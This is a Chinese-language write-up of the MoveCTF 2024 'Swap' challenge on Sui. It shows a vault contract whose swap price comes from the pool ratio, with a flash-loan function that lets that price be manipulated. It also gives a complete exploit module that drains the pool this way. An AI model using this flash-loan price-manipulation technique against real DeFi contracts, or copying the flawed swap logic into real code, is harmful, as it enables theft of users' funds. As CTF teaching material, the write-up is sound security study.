
# Swap 
考察闪电贷
题目源码 https://github.com/movebit/movectf2024-day1/tree/main/swap

## 环境搭建

部署后，先调用初始化函数
```
#!/bin/bash

PackageID=0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a

minta=0x5bc9a9a9ed82b9a0de90b6ec3926b162db1a5149937e88fb9c5e49e700d8cde9
#ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::MintA<0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA>
a_type='0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfa::CTFA'

mintb=0xb6bfd99e4341eaa3e630982750bcd4b75b1cd9d86dbeac46a83b84731bb15fb9
#ObjectType: 0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::MintB<0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB>
b_type='0x2d1ee80d8152a1b3f941c915748a680a1467dcdffe3f261527b190deddf8e48a::ctfb::CTFB'

sui client call --package $PackageID \
                --module vault \
                --function initialize \
                --type-args $a_type $b_type \
                --args $minta $mintb \


#    public entry fun initialize<A,B>(capa: MintA<A>, capb: MintB<B>,ctx: &mut TxContext) {
#        let vault = Vault<A, B> {
#            id: object::new(ctx),
#            coin_a: coin::into_balance(ctfa::mint_for_vault(capa, ctx)),
#            coin_b: coin::into_balance(ctfb::mint_for_vault(capb, ctx)),
#            flashed: false
#        };
#        transfer::share_object(vault);
#    }
```
初始化操作会给vault 100个coinA和100个coinB,给sender 10个coinA和10个coinB


## 分析

题目要求把资金池抽干
```
    public fun get_flag<A,B>(vault: &Vault<A,B>, ctx: &TxContext) {
        assert!(
            balance::value(&vault.coin_a) == 0 && balance::value(&vault.coin_b) == 0, 123
        );
        event::emit(
            Flag {
                win: true,
                sender: tx_context::sender(ctx)
            }
        );
    }
```

交换时，按照资金池里两种token的比例进行兑换
```
    public fun swap_a_to_b<A,B>(vault: &mut Vault<A,B>, coina:Coin<A>, ctx: &mut TxContext): Coin<B> {
            let amount_out_B = coin::value(&coina) * balance::value(&vault.coin_b) / balance::value(&vault.coin_a);
            coin::put<A>(&mut vault.coin_a, coina);
            coin::take(&mut vault.coin_b, amount_out_B, ctx)
    }
```
即`output_B / intput_A = balance_B / balance_A`  

使用闪电贷可以轻易的操纵这两种token的比例`balance_B / balance_A`  
```
    public fun flash<A,B>(vault: &mut Vault<A,B>, amount: u64, a_to_b: bool, ctx: &mut TxContext): (Coin<A>, Coin<B>, Receipt) {
        assert!(!vault.flashed, 1);
        let (coin_a, coin_b) = if (a_to_b) {
        (coin::zero<A>(ctx), coin::from_balance(balance::split(&mut vault.coin_b, amount ), ctx))
        }
        else {
        (coin::from_balance(balance::split(&mut vault.coin_a, amount ), ctx), coin::zero<B>(ctx))
        };

        let receipt = Receipt {
            id: object::id(vault),
            a_to_b,
            repay_amount: amount
        };
        vault.flashed = true;

        (coin_a, coin_b, receipt)

    }
```

## 利用
```
/// Module: exp
module exp::exp {

    use sui::tx_context::TxContext;
    use sui::balance::{Self, Balance};
    use sui::coin::{Self, Coin};

    use swap::vault::{Self, Vault,swap_a_to_b};

    public entry fun exp1<A,B>(vault: &mut Vault<A,B>, coina:Coin<A>, ctx: &mut TxContext) {
        //in vault, A:100,B:100

        //flashloan 99 coina
        let (coin_a, coin_b, receipt) = vault::flash(vault, 99, false, ctx);
        //in vault, A:1,B:100

        let mut input_balance= coin::into_balance(coina);//10
        let coinb = swap_a_to_b(vault,coin::from_balance(balance::split(&mut input_balance,1),ctx), ctx);
        transfer::public_transfer(coinb, tx_context::sender(ctx));
        let change = coin::from_balance(input_balance, ctx);
        transfer::public_transfer(change, tx_context::sender(ctx));
        //in vault, A:2,B:0


        //repay 99 coina
        vault::repay_flash(vault, coin_a, coin_b, receipt);
        //in vault, A:101,B:0

        // flashloan all
        let (coin_a, coin_b, receipt) = vault::flash(vault, 101, false, ctx);

        vault::get_flag(vault, ctx);
        vault::repay_flash(vault, coin_a, coin_b, receipt);
    }
}
```

## 参考资料
- [MoveCTF 2024 Writeup](https://ambergroup.medium.com/movectf-2024-writeup-f74784e020c4)

